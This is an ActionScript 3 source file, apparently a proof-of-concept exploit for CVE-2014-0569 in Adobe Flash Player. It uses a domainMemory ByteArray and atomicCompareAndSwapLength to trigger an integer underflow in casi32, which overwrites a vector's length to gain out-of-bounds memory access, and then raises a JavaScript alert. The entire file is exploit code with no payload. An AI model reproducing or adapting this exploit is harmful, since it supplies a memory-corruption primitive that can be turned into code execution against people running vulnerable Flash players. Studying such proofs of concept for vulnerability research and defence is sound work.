package
{
    import flash.display.Sprite;
    import flash.utils.ByteArray;
    import flash.system.ApplicationDomain;
    import flash.external.ExternalInterface;

    import avm2.intrinsics.memory.*;

    // Main.as
    public class Main extends Sprite
    {
        public function Main()
        {
            var i:uint = 0;

            // Make a ByteArray buffer into the hole 
            var ba:ByteArray = new ByteArray();
            ba.length = 0x1000;
            ba.writeUTFBytes("deadf00d");
            for (i = 0; i < 0x100; i++)
                ba.writeInt(0xbeadf00d);

            // Assign ba ByteArray to domainMemory
            ApplicationDomain.currentDomain.domainMemory = ba;

            // CVE-2014-0569: Make ByteArray length 0 so the casi32 integer underflow
            // can be exploited
            ba.atomicCompareAndSwapLength(0x1000, 0);

            // casi32(addr:int, expectedVal:int, newVal:int) : int
            // A compare and swap for domainMemory
            // Will return oldVal
            // Boom! overwrite length of vector.<uint>
            var boom:int = casi32(0x1000, 1022, 0x3fffffff);
            if (boom != 1022)
                return;

            ExternalInterface.call('alert', 'Let\'s debug the Flash Player');
        }
    }
}
